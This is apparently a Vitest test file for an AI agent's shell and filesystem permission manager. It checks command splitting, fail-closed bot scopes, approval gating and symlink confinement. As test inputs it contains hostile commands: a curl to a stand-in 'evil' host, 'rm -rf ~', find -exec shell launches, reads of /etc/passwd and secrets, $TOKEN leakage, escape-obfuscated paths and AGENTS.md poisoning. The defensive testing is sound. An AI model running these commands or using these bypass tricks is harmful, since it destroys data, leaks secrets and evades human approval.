import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PermissionManager, splitShellSegments } from './permissions.js';

describe('splitShellSegments', () => {
  it('passes simple commands through as a single segment', () => {
    expect(splitShellSegments('ls -la')).toEqual(['ls -la']);
    expect(splitShellSegments('cat README.md')).toEqual(['cat README.md']);
    expect(splitShellSegments('pwd')).toEqual(['pwd']);
  });

  it('splits ;, &&, ||, |, & into separate segments', () => {
    expect(splitShellSegments('echo a; reboot now')).toEqual(['echo a', 'reboot now']);
    expect(splitShellSegments('ls && pwd')).toEqual(['ls', 'pwd']);
    expect(splitShellSegments('grep foo || echo missing')).toEqual(['grep foo', 'echo missing']);
    expect(splitShellSegments('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
    expect(splitShellSegments('long-cmd &')).toEqual(['long-cmd']);
  });

  it('extracts $(...) command substitutions as separate segments', () => {
    expect(splitShellSegments('echo $(rm -rf ~)')).toContain('rm -rf ~');
    expect(splitShellSegments('cat "$(curl http://evil/x)"')).toContain('curl http://evil/x');
  });

  it('extracts backtick command substitutions as separate segments', () => {
    expect(splitShellSegments('echo `reboot now`')).toContain('reboot now');
    expect(splitShellSegments('echo "`sudo whoami`"')).toContain('sudo whoami');
  });

  it('keeps quoted text together', () => {
    expect(splitShellSegments('echo "a; b"')).toEqual(['echo "a; b"']);
    expect(splitShellSegments("echo 'a; b'")).toEqual(["echo 'a; b'"]);
  });

  it('does not expand escaped $(...) inside double quotes', () => {
    expect(splitShellSegments('echo "\\$(rm -rf ~)"')).toEqual(['echo "\\$(rm -rf ~)"']);
  });

  it('decomposes nested substitution', () => {
    const segs = splitShellSegments('echo `echo nested $(reboot now)`');
    expect(segs).toContain('reboot now');
  });

  it('decomposes subshell () and brace {} blocks', () => {
    expect(splitShellSegments('( reboot now )')).toEqual(['reboot now']);
    expect(splitShellSegments('{ reboot now; }')).toEqual(['reboot now']);
  });
});

describe('fail-closed execute scopes (bots)', () => {
  function managerWithExecuteScope() {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.filesystem.scopes = [
      { path: '/tmp/execdir', read: true, write: false, execute: true },
      { path: '/tmp/readonlydir', read: true, write: false },
    ];
    permissions.setAutoApproveAll(false);
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    return permissions;
  }

  it('runs a command whose path arguments all lie inside an execute scope', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/execdir/tool.js --flag')).resolves.toMatchObject({ allowed: true, needsApproval: false });
  });

  it('denies a command that reaches outside the execute scope', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/execdir/tool.js /etc/passwd')).resolves.toMatchObject({ allowed: false });
  });

  it('does not treat a read-only (non-execute) scope as execute', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('node /tmp/readonlydir/tool.js')).resolves.toMatchObject({ allowed: false });
  });

  it('blocked commands win over execute scopes', async () => {
    const permissions = managerWithExecuteScope();
    permissions.getManifest().capabilities.shell.blocked = ['rm *'];
    await expect(permissions.checkShellCommand('rm -rf /tmp/execdir')).resolves.toMatchObject({ allowed: false });
  });

  it('commands without path arguments stay approval-gated (cwd is not a grant)', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('npm install')).resolves.toMatchObject({ allowed: false });
  });

  it('a bare script path inside the execute scope runs without approval', async () => {
    const permissions = managerWithExecuteScope();
    await expect(permissions.checkShellCommand('/tmp/execdir/run.sh --serve')).resolves.toMatchObject({ allowed: true, needsApproval: false });
  });

  it('an ambient global autoApproved list never elevates a fail-closed context', async () => {
    const permissions = managerWithExecuteScope();
    // Simulate a global permissions.yaml where the user approved "node *":
    // an unattended bot must NOT inherit it.
    permissions.getManifest().capabilities.shell.autoApproved = ['node *'];
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: false });
    // Explicit bot grants DO apply.
    permissions.setBotShellAllowList(['node *']);
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: true, needsApproval: false });
    // needsApproval still wins over the bot list.
    permissions.getManifest().capabilities.shell.needsApproval = ['node *'];
    await expect(permissions.checkShellCommand('node script.js')).resolves.toMatchObject({ allowed: false });
  });
});

describe('fail-closed skill elevation', () => {
  it('elevateForSkill is a no-op in fail-closed mode (skills never re-permission a bot)', async () => {
    const permissions = new PermissionManager();
    permissions.getManifest().capabilities.shell.enabled = true;
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    permissions.elevateForSkill(['fs_write', 'run_command', 'read_file']);
    // Without the guard, elevation would bypass the fail-closed gates.
    await expect(permissions.checkFsAccess('/etc/hosts', 'write')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('npm install')).resolves.toMatchObject({ allowed: false });
  });
});

describe('most-specific scope wins', () => {
  it('a deep grant is not shadowed by a broader read-only ancestor', async () => {
    const permissions = new PermissionManager();
    permissions.getManifest().capabilities.filesystem.scopes = [
      { path: '/tmp/root', read: true, write: false },
      { path: '/tmp/root/deep', read: true, write: true },
    ];
    permissions.setFailClosed(true);
    permissions.setCurrentContext('bot', 'worker');
    await expect(permissions.checkFsAccess('/tmp/root/deep/file.txt', 'write')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkFsAccess('/tmp/root/other.txt', 'write')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkFsAccess('/tmp/root/other.txt', 'read')).resolves.toMatchObject({ allowed: true });
  });
});

describe('PermissionManager remote safety', () => {
  it('enforces hard command blocks before Local allow-all', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = ['rm *'];
    permissions.setAutoApproveAll(true);

    await expect(permissions.checkShellCommand('rm -rf project')).resolves.toMatchObject({ allowed: false });
  });

  it('does not let Local CLI allow-all silently elevate a Cloud request', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('yes');
    permissions.onAsk(ask);
    permissions.setAutoApproveAll(true);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledOnce();
  });

  it('scopes always approval to the exact command and interaction context', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValueOnce('always').mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('npm install example')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('npm install different')).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(2);
  });

  it('does not classify redirection or mutating read-command flags as safe reads', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    await expect(permissions.checkShellCommand('echo poisoned > AGENTS.md')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('echo poisoned>AGENTS.md')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -delete')).resolves.toMatchObject({ allowed: false });
    // find -exec/-execdir launch a subprocess — the advisory payload from
    // issues #71/#77/#101 (and #110), minus the redirection so this exercises
    // the find-flag rule on its own rather than the redirection rule.
    await expect(permissions.checkShellCommand("find . -maxdepth 0 -exec sh -c 'id' ';'")).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -execdir touch canary \\;')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch -D protected')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch --delete protected')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('git branch new-branch')).resolves.toMatchObject({ allowed: false });
    expect(ask).toHaveBeenCalledTimes(8);
  });

  it('does not classify wc --files0-from as a safe read (indirect path deref)', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // ``--files0-from`` reads the paths listed inside the file, which the
    // literal-path gate never inspects at approval time.
    await expect(permissions.checkShellCommand('wc --files0-from=list0.bin')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('wc --files0-from list0.bin')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('wc -l --files0-from=list0.bin')).resolves.toMatchObject({ allowed: false });
    // A plain wc read stays auto-approved.
    await expect(permissions.checkShellCommand('wc -l README.md')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(3);
  });

  it('find -fprint/-fprintf/-files0-from are side-effectful or indirect — require approval', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // -fprint/-fprintf WRITE files with an attacker-chosen path — the same
    // arbitrary-write class the -exec deny covers (issue #110's family).
    await expect(permissions.checkShellCommand('find . -fprint out.txt')).resolves.toMatchObject({ allowed: false });
    await expect(permissions.checkShellCommand('find . -fprintf out.txt %p')).resolves.toMatchObject({ allowed: false });
    // -files0-from dereferences a path list the literal-path gate never sees.
    await expect(permissions.checkShellCommand('find . -files0-from=list.bin')).resolves.toMatchObject({ allowed: false });
    // The generic indirection rule covers the other safe-read commands.
    await expect(permissions.checkShellCommand('du --files0-from=list.bin')).resolves.toMatchObject({ allowed: false });
    // Plain reads must keep working without a prompt.
    await expect(permissions.checkShellCommand('find . -maxdepth 1')).resolves.toMatchObject({ allowed: true });
    await expect(permissions.checkShellCommand('du -sh .')).resolves.toMatchObject({ allowed: true });
    expect(ask).toHaveBeenCalledTimes(4);
  });

  it('requires approval for safe-read commands that rely on shell expansion', async () => {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.shell.enabled = true;
    manifest.capabilities.shell.blocked = [];
    const ask = vi.fn().mockResolvedValue('no');
    permissions.onAsk(ask);
    permissions.setCurrentContext('web', 'cloud-request-1');

    // $HOME/… expands to a path the literal gate never saw (CVE-2026-28463).
    await expect(permissions.checkShellCommand('head $HOME/secret.txt')).resolves.toMatchObject({ allowed: false });
    // ${…} and command substitution are the same class.
    await expect(permissions.checkShellCommand('cat ${HOME}/secret.txt')).resolves.toMatchObject({ allowed: false });
    // $VAR discloses environment values (issue #76/#80).
    await expect(permissions.checkShellCommand('echo $TOKEN')).resolves.toMatchObject({ allowed: false });
    // Home shorthands expand after the check too.
    await expect(permissions.checkShellCommand('cat ~/secret.txt')).resolves.toMatchObject({ allowed: false });
    // ANSI-C quoting expands hex/unicode escapes post-check (same class as #95).
    await expect(permissions.checkShellCommand("head $'\\x2fetc\\x2fpasswd'")).resolves.toMatchObject({ allowed: false });
    // A plain read relative to cwd stays auto-approved.
    await expect(permissions.checkShellCommand('head file.txt')).resolves.toMatchObject({ allowed: true });
  });
});

describe('PermissionManager symlink write confinement', () => {
  let root: string;
  let ws: string;
  let outside: string;

  function makePermissions(): PermissionManager {
    const permissions = new PermissionManager();
    const manifest = permissions.getManifest();
    manifest.capabilities.filesystem.enabled = true;
    manifest.capabilities.filesystem.scopes.push({ path: ws, read: true, write: true });
    permissions.setAutoApproveAll(true);
    return permissions;
  }

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'mercury-fs-'));
    ws = join(root, 'ws');
    outside = join(root, 'outside');
    mkdirSync(ws);
    mkdirSync(outside);
    writeFileSync(join(outside, 'secret.txt'), 'x');
    symlinkSync(join(outside, 'secret.txt'), join(ws, 'alias.txt'));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('denies a write that escapes the scope through an in-scope symlink', async () => {
    const permissions = makePermissions();
    await expect(permissions.checkFsAccess(join(ws, 'alias.txt'), 'write')).resolves.toMatchObject({ allowed: false });
  });

  it('still allows a plain write inside the scope', async () => {
    const permissions = makePermissions();
    await expect(permissions.checkFsAccess(join(ws, 'new.txt'), 'write')).resolves.toMatchObject({ allowed: true });
  });

  it('allows a symlink whose target stays inside the scope', async () => {
    const permissions = makePermissions();
    writeFileSync(join(ws, 'inner.txt'), 'x');
    symlinkSync(join(ws, 'inner.txt'), join(ws, 'inner-alias.txt'));
    await expect(permissions.checkFsAccess(join(ws, 'inner-alias.txt'), 'write')).resolves.toMatchObject({ allowed: true });
  });
});
